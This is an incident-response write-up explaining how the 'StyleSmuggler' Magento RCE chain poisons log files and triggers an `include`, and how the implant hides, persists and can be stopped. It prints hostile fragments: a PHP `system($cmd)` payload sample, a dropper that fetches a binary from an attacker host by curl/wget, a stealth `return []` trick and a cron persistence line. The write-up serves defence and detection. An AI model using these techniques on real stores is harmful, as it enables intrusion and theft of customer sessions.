# How StyleSmuggler works

A mechanical walkthrough of the Magento/Adobe Commerce RCE that Sansec disclosed on
5 September 2026, written from a real incident response on a compromised 2.4.7-p2 store.

This document explains the **mechanism**, so defenders can reason about it and recognise
variants. It does not publish the assembled request that drives the chain. See
[Scope](#scope) at the end.

---

## TL;DR

The attack turns a log file into an executable. It works in two stages:

1. **Poison.** Send input Magento will reject, and which Magento then writes verbatim into a
   file. The file now contains PHP source.
2. **Execute.** Send a second request that makes Magento `include` that file. PHP parses and
   runs the smuggled code.

Neither stage is a memory-corruption trick. Both use Magento doing exactly what it was
written to do.

---

## The full chain

```
  ATTACKER                    MAGENTO (PHP-FPM)                 FILESYSTEM
     │                              │                               │
     │ ① input containing <?php     │                               │
     │   in a field that gets       │                               │
     │   logged on failure          │                               │
     ├─────────────────────────────>│                               │
     │                              │                               │
     │                              │ input REJECTED                │
     │                              │ (validation works!)           │
     │                              │                               │
     │                              │ ...but the error handler      │
     │                              │ writes the raw input into     │
     │                              │ the log                       │
     │                              ├──────────────────────────────>│
     │                              │                    var/log/system.log
     │                              │                    var/report/<hash>
     │                              │                               │
     │                              │        ┌──────────────────────┴────┐
     │                              │        │ file now holds:           │
     │                              │        │   ...log text...          │
     │                              │        │   <?php  payload  ?>      │
     │                              │        │   ...log text...          │
     │                              │        └──────────────────────┬────┘
     │                              │                               │
     │ ② request that reaches a     │                               │
     │   code path doing            │                               │
     │   `include $file`            │                               │
     ├─────────────────────────────>│                               │
     │                              │  include <poisoned file>      │
     │                              │<──────────────────────────────┤
     │                              │                               │
     │                       ┌──────┴───────┐                       │
     │                       │ PHP PARSES   │                       │
     │                       │ AND EXECUTES │                       │
     │                       │ the file     │                       │
     │                       └──────┬───────┘                       │
     │                              │                               │
     │              code now running INSIDE the                     │
     │              PHP-FPM worker serving this request             │
     │                              │                               │
     └──────────────────────────────┴───────────────────────────────┘
```

---

## Stage 1: the poison

Magento validates the input and refuses it. That part works. The problem is what happens
next: the error path writes the attacker's raw input into a file, unescaped.

Two known sinks, and **variants differ in which they use**:

```
   var/log/system.log     an invalid store code produces a log line
                          containing the submitted value verbatim

   var/report/<hash>      an uncaught exception writes a failure report
                          containing request data
```

Checking only one location misses the other. Sansec's published check looks at `var/report/`;
the store we responded to was poisoned through `var/log/system.log`.

Nothing about stage 1 looks like an attack in a log. It is indistinguishable from a broken
integration submitting garbage, which is why it cannot be filtered without breaking real
traffic.

```
   what the attacker sends            what lands in the file
   ─────────────────────────          ──────────────────────────────────────
   store code:                        [2026-09-05T11:10:05] main.CRITICAL:
     <?php /* payload */ ?>             Requested store is not found
                                        (<?php /* payload */ ?>)
```

---

## Stage 2: the execution

The second request drives Magento into a code path that calls `include` on a path the
attacker controls. The path lands in Magento's dependency-injection compiler, in this method:

```php
// setup/src/Magento/Setup/Module/Di/Code/Scanner/ArrayScanner.php
public function collectEntities(array $files)
{
    $output = [];
    foreach ($files as $file) {
        if (file_exists($file)) {
            $data = include $file;                 // ← here
            $output = array_merge($output, $data);
        }
    }
    return $output;
}
```

### Why `include` is the whole ballgame

`include` does not read a file. It **parses and executes** it, exactly as if the file were
part of your application:

```
   include on a mixed file
   ───────────────────────────────────────────────────────────
   [2026-09-05] main.CRITICAL: ...     →  echoed as raw output
   <?php system($cmd); ?>              →  EXECUTED
   [2026-09-05] main.ERROR: ...        →  echoed as raw output
```

The log text around the payload is harmless noise. The `<?php ?>` block runs.

### Two sibling methods do the same thing

`ArrayScanner` is not alone. Two more classes in the same DI compiler take a variable path
and hand it to `require_once`:

```
   setup/src/Magento/Setup/Module/Di/Code/
     ├── Scanner/ArrayScanner.php            collectEntities()          include
     ├── Reader/ClassesScanner.php           includeClass()             require_once
     └── Scanner/XmlInterceptorScanner.php   _handleControllerClassName()  require_once
```

All three exist only to serve `bin/magento setup:di:compile`. None has any business running
during an HTTP request. That is what makes the CLI guard in
[README §3](README.md#3-make-the-di-scanners-cli-only) both effective and free.

### The forensic tell

`include` returns `int(1)` for a file with no `return` statement. A poisoned log file has
none. So the line **after** the include throws:

```
   $data = include $file;                 → payload has ALREADY executed
   $output = array_merge($output, $data); → array_merge(): Argument #2 must be
                                            of type array, int given
```

That TypeError in your logs is **evidence the exploit succeeded**, not evidence it failed.
We initially misread it as a failed attempt; the dropped binary appeared three seconds later.

The stealthier variant ends its payload with `return [];`, so `array_merge` receives a real
array, nothing throws, and no error appears at all.

---

## Post-exploitation

```
   code executing in PHP-FPM
            │
            │ probes for a usable exec function, in order:
            │   shell_exec → exec → system → passthru → proc_open → popen
            ▼
   ┌────────────────────────────────────────────────┐
   │ curl/wget  https://247.cdnflare.xyz/files/...  │
   │            picks x64 or arm64 via `uname -m`   │
   └────────────────────┬───────────────────────────┘
                        │
                        ▼
              /tmp/.kw_<random><random>
                   chmod 755
                   nohup ... &
                        │
                        ▼
   ┌────────────────────────────────────────────────┐
   │ implant: ~1.9 MB stripped static Rust binary   │
   │ renames itself  [kworker/u:8:0]                │
   │ relocates to ~/.local/share/.gvfsd/gvfsd-user  │
   │ heartbeat file  .gvfsd_<8hex>.lock             │
   └────────────────────┬───────────────────────────┘
                        │
                        ▼
   crontab:  */5 * * * * exec <home>/.local/share/.gvfsd/gvfsd-user
```

The dropper is time-boxed. The payload we recovered carried a `time()` deadline roughly three
minutes out, plus a secret header check (`X-TRACE-<8hex>` against a hardcoded hash), so the
planted code only runs for the attacker's own follow-up request and is inert afterwards.

---

## Why it hides so well

### 1. The process name is camouflage

```
   ps output                                    what it really is
   ──────────────────────────────────────       ─────────────────────────
   root      12  0.0  [kworker/0:1]             genuine kernel thread
   root      31  0.0  [kworker/u8:2]            genuine kernel thread
   webuser 1724  0.1  [kworker/u:8:0]   ← 3MB   THE IMPLANT
```

Genuine kernel threads are **always owned by root and have no resident memory**. A bracketed
name on a site uid with real RSS is the tell. A `grep -v '\['` written to filter kernel noise
will hide the implant instead.

### 2. It may make no outbound connection at all

In the infection we handled, the implant opened **zero** external sockets. It held 28
connections to `127.0.0.1:6379`, the store's own Redis, issuing `select` / `hget` / `expire`
against Magento's session storage.

```
   expected C2 pattern              what we actually found
   ─────────────────────            ──────────────────────────────
   implant ──TLS──> internet        implant ──> 127.0.0.1:6379
   (visible on the wire)            (invisible to network monitoring,
                                     and it can read live sessions)
```

Absence of suspicious network traffic proves nothing.

### 3. Scanners look in the wrong place

```
   /home/<user>/
     ├── .local/share/.gvfsd/gvfsd-user      ← implant lives HERE
     └── domains/<domain>/public_html/       ← scanners look HERE
```

A malware scanner scoped to the document root walks straight past it. Ours ran two hours
before the infection was found and reported clean, correctly, for the path it was given.

---

## Where the mitigations cut

```
   ①  poison a file                    NOT FILTERABLE
        │                              looks like ordinary broken input
        ▼
   ②  request that triggers include    ◄── LAYER A: web-server rules
        │                                  drop the request before PHP
        ▼
   ③  include $file  →  RCE            ◄── LAYER B: PHP_SAPI !== 'cli'
        │                                  the DI scanners refuse to run
        ▼
   ④  dropper spawns implant           ◄── disable_functions on the FPM pool
        │                                  removes every exec primitive it probes
        ▼
   ⑤  cron persistence
```

Layers A and B are independent. Either one alone breaks the chain, which is why applying both
is worth the small effort: if someone finds another route to stage 2, layer B still holds.

Layer A is deploy-proof. Layer B is reverted by `composer install`, because `setup/` ships from
`magento/magento2-base`, so re-apply it after every deploy.

---

## Observed timeline

From the store we responded to, all times CEST on 5 September 2026:

```
   02:55   first exploitation attempt
   04:20   implant running
   13:10   second wave, 40 requests in 13 seconds
   13:10   the store emails its own owner a mangled "payment failed"
           notification containing fragments of the payload
   13:25   owner forwards that email to his agency
   13:51   compromise confirmed
   14:14   contained
```

That mangled notification email is worth knowing about. When the payload passes through
Magento's template renderer, the merchant gets a failure email full of unrendered
`{{var ...}}` directives and a nonsense customer address on a `.invalid` domain. It reads
like a broken checkout. It is the most likely thing a merchant will actually notice, and in
this case it is the only reason the infection was caught the same day.

---

## Scope

This document names the vulnerable sink, because a defender cannot evaluate a fix without
knowing what it fixes, and because `ArrayScanner::collectEntities()` is discoverable by anyone
reading Magento's source.

It does not publish the assembled request that reaches that sink. Sansec withheld the full
gadget chain when they disclosed, and with no vendor patch available that restraint still
holds. Nothing here is weakened by the omission: every rule in the README works without it.

Credit for discovery, naming and the original advisory belongs to the
[Sansec](https://sansec.io) forensics team.
